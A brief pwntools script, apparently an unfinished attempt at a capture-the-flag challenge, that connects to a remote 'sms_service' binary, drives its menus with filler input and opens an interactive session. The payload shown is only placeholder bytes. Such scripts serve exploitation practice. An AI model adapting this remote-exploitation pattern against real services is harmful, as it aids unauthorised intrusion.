from pwn import *

#p = process("./sms_service")
p = remote("pwnable.shop",10001)
e = ELF("./sms_service")
l = ELF("./libc.so.6",checksec=False)

def soldier(data,index):
    p.sendlineafter(">>","1")
    p.sendlineafter(">>","1")
    p.sendlineafter(">>",data)
    p.sendlineafter(">>",index)
    p.sendlineafter(">>","3")

def citizen(data):
    p.sendlineafter(">>","2")
    p.sendlineafter(">>",data)
    p.sendlineafter(">>","1")

soldier("AAAA","1337")

payload = 'A'*4
payload += "\x0a"

citizen(payload)

p.interactive()
